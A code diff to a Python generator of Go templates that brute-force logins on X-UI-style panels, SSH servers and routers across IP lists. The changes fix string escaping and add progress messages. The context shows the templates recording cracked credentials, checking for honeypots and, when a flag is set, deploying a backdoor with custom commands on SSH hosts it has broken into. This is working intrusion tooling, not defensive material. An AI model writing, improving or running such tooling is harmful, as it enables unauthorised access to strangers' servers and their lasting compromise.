@@ -42,7 +42,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -105,11 +105,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -117,7 +117,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
-						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 						return
 					}
 				}
@@ -136,15 +136,15 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 
 
@@ -179,7 +179,7 @@ func main() {
 
 	var batch []string
 
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -188,6 +188,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -198,7 +199,7 @@ func main() {
 
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板2内容 (已修复) ===========================
@@ -281,11 +282,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			}
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -293,7 +294,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				var responseData map[string]interface{}
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if success, ok := responseData["success"].(bool); ok && success {
-						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+						writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 						return
 					}
 				}
@@ -312,15 +313,15 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 
 		if count >= totalTasks {
@@ -339,7 +340,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -370,7 +371,7 @@ func main() {
 	defer file.Close()
 
 	var batch []string
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -379,6 +380,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -389,7 +391,7 @@ func main() {
 	
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板3内容 (已修复) ===========================
@@ -425,7 +427,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -480,11 +482,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			resp, err := postRequest(ctx, url, username, password)
 			cancel()
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode == http.StatusOK {
@@ -493,7 +495,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				if err := json.Unmarshal(body, &responseData); err == nil {
 					if data, ok := responseData["data"].(map[string]interface{}); ok {
 						if token, exists := data["accessToken"].(string); exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 							return
 						}
 					}
@@ -513,15 +515,15 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 
 		if count >= totalTasks {
@@ -554,7 +556,7 @@ func main() {
 	defer file.Close()
 
 	var batch []string
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -563,6 +565,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -573,7 +576,7 @@ func main() {
 
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板4内容 (已修复) ===========================
@@ -609,7 +612,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -668,11 +671,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 			
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 			
 			if resp.StatusCode != 200 {
@@ -685,7 +688,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				if success, ok := responseData["success"].(bool); ok && success {
 					if data, ok := responseData["data"].(map[string]interface{}); ok {
 						if token, exists := data["token"]; exists && token != "" {
-							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+							writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 							return
 						}
 					}
@@ -703,15 +706,15 @@ func updateProgress() {
 		percent := float64(count) / float64(totalTasks) * 100
 		elapsed := int(time.Since(startTime).Seconds())
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 		
 		if count >= totalTasks {
@@ -744,7 +747,7 @@ func main() {
 	defer file.Close()
 
 	var batch []string
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -753,6 +756,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -763,7 +767,7 @@ func main() {
 
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板5内容 (已修复) ===========================
@@ -799,7 +803,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -856,11 +860,11 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			cancel()
 
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 				continue
 			}
 
-			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\\\n", ip, port, resp.StatusCode)
+			fmt.Printf("[INFO] 响应 from %s:%s | Status: %d\\n", ip, port, resp.StatusCode)
 			defer resp.Body.Close()
 
 			if resp.StatusCode != 200 {
@@ -871,7 +875,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 			var responseData map[string]interface{}
 			if err := json.Unmarshal(body, &responseData); err == nil {
 				if success, ok := responseData["success"].(bool); ok && success {
-					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 					return
 				}
 			}
@@ -889,15 +893,15 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 
 		if count >= totalTasks {
@@ -930,7 +934,7 @@ func main() {
 	defer file.Close()
 
 	var batch []string
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -939,6 +943,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -949,7 +954,7 @@ func main() {
 
 	wg.Wait() 
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板6内容 (已修复) ===========================
@@ -981,7 +986,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -1054,7 +1059,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 		for _, password := range passwords {
 			client, success, err := trySSH(ip, port, username, password)
 			if err != nil {
-				fmt.Printf("[-] 连接失败 %s:%s - %v\\\\n", ip, port, err)
+				fmt.Printf("[-] 连接失败 %s:%s - %v\\n", ip, port, err)
 			}
 			if success {
 				defer client.Close()
@@ -1080,7 +1085,7 @@ func processIP(ipPort string, file *os.File, usernames []string, passwords []str
 				}
 
 				if !isLikelyHoneypot(client) {
-					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+					writeResultToFile(file, fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 					if ENABLE_BACKDOOR {
 						deployBackdoor(client, ip, port, username, password, CUSTOM_BACKDOOR_CMDS)
 					}
@@ -1108,7 +1113,7 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			lastUpdateTime = time.Now()
 			lastCompletedCount = count
 			continue
@@ -1116,13 +1121,13 @@ func updateProgress() {
 
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 		
 		if count == lastCompletedCount && time.Since(lastUpdateTime) > 60*time.Second {
-	        fmt.Println("\\\\n进度卡住，重新开始当前任务")
+	        fmt.Println("\\n进度卡住，重新开始当前任务")
 	        triggerFileCleanUp()
 	        return
           }
@@ -1132,7 +1137,7 @@ func updateProgress() {
 		lastUpdateTime = time.Now()
 
 		if count >= totalTasks {
-			fmt.Println("\\\\n进度完成！")
+			fmt.Println("\\n进度完成！")
 			return
 		}
 	}
@@ -1292,7 +1297,7 @@ func recordSuccess(ip, port, username, password string) {
 	f, err := os.OpenFile("hmsuccess.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
 		defer f.Close()
-		f.WriteString(fmt.Sprintf("%s:%s %s %s\\\\n", ip, port, username, password))
+		f.WriteString(fmt.Sprintf("%s:%s %s %s\\n", ip, port, username, password))
 		f.Sync()
 	}
 }
@@ -1301,7 +1306,7 @@ func recordFailure(ip, port, username, password, reason string) {
 	f, err := os.OpenFile("hmfail.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err == nil {
 		defer f.Close()
-		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\\\n", ip, port, username, password, reason))
+		f.WriteString(fmt.Sprintf("%s:%s %s %s 失败原因: %s\\n", ip, port, username, password, reason))
 	}
 }
 
@@ -1319,7 +1324,7 @@ RETRY:
 	passwords := {pass_list}
 
 	batch := []string{}
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -1328,6 +1333,7 @@ RETRY:
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	completedCount = 0
 	lastCompletedCount = 0
@@ -1357,7 +1363,7 @@ RETRY:
 	}
 
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 
 
@@ -1403,7 +1409,7 @@ func loadInputFile(inputFile string) []string {
 		fmt.Println("无法读取输入文件:", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var cleaned []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -1415,7 +1421,7 @@ func loadInputFile(inputFile string) []string {
 }
 
 func writeResultToFile(file *os.File, text string) {
-	file.WriteString(text + "\\\\n")
+	file.WriteString(text + "\\n")
 }
 
 func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool, error) {
@@ -1433,7 +1439,7 @@ func sendRequest(ctx context.Context, client *http.Client, fullURL string) (bool
 	}
 	defer resp.Body.Close()
 
-	fmt.Printf("[INFO] 响应 from %s | Status: %d\\\\n", fullURL, resp.StatusCode)
+	fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", fullURL, resp.StatusCode)
 
 	if resp.StatusCode == http.StatusOK {
 		bodyBytes, _ := io.ReadAll(resp.Body)
@@ -1454,7 +1460,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel1()
 	success, err := sendRequest(ctx1, client, httpProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\\\n", httpProbeURL, err)
+		fmt.Printf("[-] 连接失败 %s - %v\\n", httpProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("http://%s?api=http://%s/%s", ipPort, ipPort, cleanPath)
@@ -1466,7 +1472,7 @@ func tryBothProtocols(ipPort string, path string, client *http.Client, file *os.
 	defer cancel2()
 	success, err = sendRequest(ctx2, client, httpsProbeURL)
 	if err != nil {
-		fmt.Printf("[-] 连接失败 %s - %v\\\\n", httpsProbeURL, err)
+		fmt.Printf("[-] 连接失败 %s - %v\\n", httpsProbeURL, err)
 	}
 	if success {
 		output := fmt.Sprintf("https://%s?api=https://%s/%s", ipPort, ipPort, cleanPath)
@@ -1504,15 +1510,15 @@ func updateProgress() {
 		elapsed := int(time.Since(startTime).Seconds())
 
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 
 		if count >= totalTasks {
@@ -1541,6 +1547,7 @@ func main() {
 	defer file.Close()
 
 	totalTasks = int64(len(lines))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -1553,7 +1560,7 @@ func main() {
 
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 '''
 # =========================== xui.go模板8内容 (已修复) ===========================
@@ -1593,7 +1600,7 @@ func loadList(filename string) []string {
 		fmt.Println("无法读取", filename, ":", err)
 		os.Exit(1)
 	}
-	lines := strings.Split(string(content), "\\n")
+	lines := strings.Split(string(content), "\n")
 	var result []string
 	for _, line := range lines {
 		line = strings.TrimSpace(line)
@@ -1681,18 +1688,18 @@ func processIP(line string, file *os.File, usernames []string, passwords []strin
 				resp, err := postRequest(ctx, finalURL, username, password, origin, referer)
 				cancel()
 				if err != nil {
-					fmt.Printf("[-] 连接失败 %s - %v\\\\n", finalURL, err)
+					fmt.Printf("[-] 连接失败 %s - %v\\n", finalURL, err)
 					continue
 				}
 
-				fmt.Printf("[INFO] 响应 from %s | Status: %d\\\\n", finalURL, resp.StatusCode)
+				fmt.Printf("[INFO] 响应 from %s | Status: %d\\n", finalURL, resp.StatusCode)
 				defer resp.Body.Close()
 				
 				cookies := resp.Cookies()
 				for _, c := range cookies {
 					if c.Name == "sysauth_http" && c.Value != "" {
-						fmt.Printf("[+] 爆破成功: %s %s %s\\\\n", finalURL, username, password)
-						writeResultToFile(file, fmt.Sprintf("%s %s %s\\\\n", finalURL, username, password))
+						fmt.Printf("[+] 爆破成功: %s %s %s\\n", finalURL, username, password)
+						writeResultToFile(file, fmt.Sprintf("%s %s %s\\n", finalURL, username, password))
 						return
 					}
 				}
@@ -1709,15 +1716,15 @@ func updateProgress() {
 		percent := float64(count) / float64(totalTasks) * 100
 		elapsed := int(time.Since(startTime).Seconds())
 		if count == 0 {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%)", count, totalTasks, percent)
 			continue
 		}
 		
 		if totalTasks > count {
 			remaining := int(float64(elapsed)/float64(count)*(float64(totalTasks)-float64(count)))
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 预计剩余: %d分%d秒", count, totalTasks, percent, remaining/60, remaining%60)
 		} else {
-			fmt.Printf("\\\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
+			fmt.Printf("\\r处理进度: %d/%d (%.2f%%) 全部完成", count, totalTasks, percent)
 		}
 		
 		if count >= totalTasks {
@@ -1752,7 +1759,7 @@ func main() {
 	defer file.Close()
 
 	var batch []string
-	allLines := strings.Split(string(lines), "\\n")
+	allLines := strings.Split(string(lines), "\n")
 	for _, line := range allLines {
 		line = strings.TrimSpace(line)
 		if line != "" {
@@ -1761,6 +1768,7 @@ func main() {
 	}
 
 	totalTasks = int64(len(batch))
+    fmt.Printf("成功加载 %d 个任务，开始处理...\\n", totalTasks)
 	startTime = time.Now()
 	go updateProgress()
 
@@ -1771,7 +1779,7 @@ func main() {
 	
 	wg.Wait()
 	time.Sleep(1 * time.Second)
-	fmt.Println("\\\\n全部处理完成！")
+	fmt.Println("\\n全部处理完成！")
 }
 
 '''
@@ -1913,14 +1921,18 @@ def input_filename_with_default(prompt, default):
     return user_input if user_input else default
 
 def escape_go_string(s: str) -> str:
+    # In python, backslash is an escape character. To write a literal backslash, you must escape it.
     return s.replace("\\", "\\\\").replace('"', '\\"')
 
 def generate_xui_go(semaphore_size, usernames, passwords):
     user_list = "[]string{" + ", ".join([f'"{escape_go_string(u)}"' for u in usernames]) + "}"
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
+    # In a python multiline string, to write a literal \n, you must escape it as \\n
+    # The same applies to \r -> \\r
     code = XUI_GO_TEMPLATE_1.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1929,7 +1941,8 @@ def generate_xui_go_template2(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_2.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1938,7 +1951,8 @@ def generate_xui_go_template3(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_3.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1947,7 +1961,8 @@ def generate_xui_go_template4(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_4.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1956,7 +1971,8 @@ def generate_xui_go_template5(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_5.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1978,7 +1994,8 @@ def generate_xui_go_template6(semaphore_size, usernames, passwords, install_back
                             .replace("{user_list}", user_list) \
                             .replace("{pass_list}", pass_list) \
                             .replace("{enable_backdoor}", backdoor_flag) \
-                            .replace("{custom_backdoor_cmds}", cmd_array)
+                            .replace("{custom_backdoor_cmds}", cmd_array) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1987,7 +2004,8 @@ def generate_xui_go_template7(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
     code = XUI_GO_TEMPLATE_7.replace("{semaphore_size}", str(semaphore_size)) \
                             .replace("{user_list}", user_list) \
-                            .replace("{pass_list}", pass_list)
+                            .replace("{pass_list}", pass_list) \
+                            .replace("\\n", "\\\\n").replace("\\r", "\\\\r")
     with open('xui.go', 'w', encoding='utf-8') as f:
         f.write(code)
 
@@ -1996,7 +2014,8 @@ def generate_xui_go_template8(semaphore_size, usernames, passwords):
     pass_list = "[]string{" + ", ".join([f'"{escape_go_string(p)}"' for p in passwords]) + "}"
